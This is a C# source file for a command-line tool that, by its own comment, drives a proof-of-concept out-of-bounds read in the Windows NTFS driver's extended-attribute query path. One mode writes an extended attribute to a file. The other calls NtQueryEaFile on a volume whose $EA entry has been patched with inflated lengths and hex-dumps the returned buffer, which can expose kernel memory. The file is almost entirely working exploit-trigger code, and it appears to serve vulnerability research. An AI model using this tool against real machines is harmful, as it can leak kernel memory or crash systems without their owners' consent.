using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

// eatool set   <path>                     create file at <path>, set EA MAGICEA_ = 16x 0x41
// eatool query <path> <bufBytes> <outTxt> NtQueryEaFile into a bufBytes buffer, hex-dump result
//
// Used by the self-contained NTFS $EA OOB-read PoC: 'set' writes a normal EA onto
// a file on a scratch NTFS volume; the volume is then detached and its on-disk
// $EA entry is patched (EaValueLength / attribute length inflated) to what a
// malicious volume would contain; 'query' re-reads it, driving the vulnerable
// Ntfs!NtfsQueryEaSimpleScan with no debugger in the trigger path.
class EaTool
{
    [StructLayout(LayoutKind.Sequential)]
    struct IO_STATUS_BLOCK { public IntPtr Status; public IntPtr Information; }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sa,
                                     uint disp, uint flags, IntPtr tmpl);

    [DllImport("ntdll.dll")]
    static extern int NtSetEaFile(IntPtr h, ref IO_STATUS_BLOCK io, byte[] buf, int len);

    [DllImport("ntdll.dll")]
    static extern int NtQueryEaFile(IntPtr h, ref IO_STATUS_BLOCK io, byte[] buf, int len,
                                    bool single, IntPtr eaList, int eaListLen,
                                    IntPtr eaIndex, bool restart);

    const uint GENERIC_READ = 0x80000000, GENERIC_WRITE = 0x40000000;
    const uint FILE_SHARE_ALL = 0x7;
    const uint CREATE_ALWAYS = 2, OPEN_EXISTING = 3;
    const uint FLAG_BACKUP = 0x02000000; // FILE_FLAG_BACKUP_SEMANTICS

    static IntPtr Open(string path, uint disp)
    {
        return CreateFileW(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_ALL,
                           IntPtr.Zero, disp, FLAG_BACKUP, IntPtr.Zero);
    }

    static int Main(string[] a)
    {
        if (a.Length >= 2 && a[0] == "set")
        {
            IntPtr h = Open(a[1], CREATE_ALWAYS);
            if (h.ToInt64() == -1) { Console.WriteLine("CreateFile fail " + Marshal.GetLastWin32Error()); return 1; }
            string name = "MAGICEA_"; byte nl = (byte)name.Length; ushort vl = 16;
            int entry = ((4 + 1 + 1 + 2 + (nl + 1) + vl) + 3) & ~3;
            byte[] ea = new byte[entry];
            ea[5] = nl; ea[6] = (byte)(vl & 0xff); ea[7] = (byte)(vl >> 8);
            for (int i = 0; i < nl; i++) ea[8 + i] = (byte)name[i];
            for (int i = 0; i < vl; i++) ea[8 + nl + 1 + i] = 0x41;
            IO_STATUS_BLOCK io = new IO_STATUS_BLOCK();
            int st = NtSetEaFile(h, ref io, ea, ea.Length);
            Console.WriteLine("NtSetEaFile=0x" + st.ToString("X8"));
            return 0;
        }
        if (a.Length >= 4 && a[0] == "query")
        {
            int bufLen = int.Parse(a[2]);
            string outp = a[3];
            IntPtr h = Open(a[1], OPEN_EXISTING);
            if (h.ToInt64() == -1) { File.WriteAllText(outp, "CreateFile fail " + Marshal.GetLastWin32Error()); return 1; }
            byte[] buf = new byte[bufLen];
            IO_STATUS_BLOCK io = new IO_STATUS_BLOCK();
            Console.WriteLine("calling NtQueryEaFile bufLen=" + bufLen);
            int q = NtQueryEaFile(h, ref io, buf, bufLen, false, IntPtr.Zero, 0, IntPtr.Zero, true);
            long info = io.Information.ToInt64();
            var sb = new StringBuilder();
            sb.AppendLine("NtQueryEaFile = 0x" + q.ToString("X8"));
            sb.AppendLine("bytesReturned = " + info + " (0x" + info.ToString("X") + ")");
            int dump = (int)Math.Min(info > 0 ? info : 64, 2048);
            for (int i = 0; i < dump; i += 16)
            {
                sb.Append(i.ToString("X4") + ": ");
                for (int j = 0; j < 16 && i + j < dump; j++)
                    sb.Append(buf[i + j].ToString("X2") + " ");
                sb.AppendLine();
            }
            File.WriteAllText(outp, sb.ToString());
            Console.WriteLine("wrote " + outp);
            return 0;
        }
        Console.WriteLine("usage: eatool set <path> | query <path> <bufBytes> <outTxt>");
        return 2;
    }
}
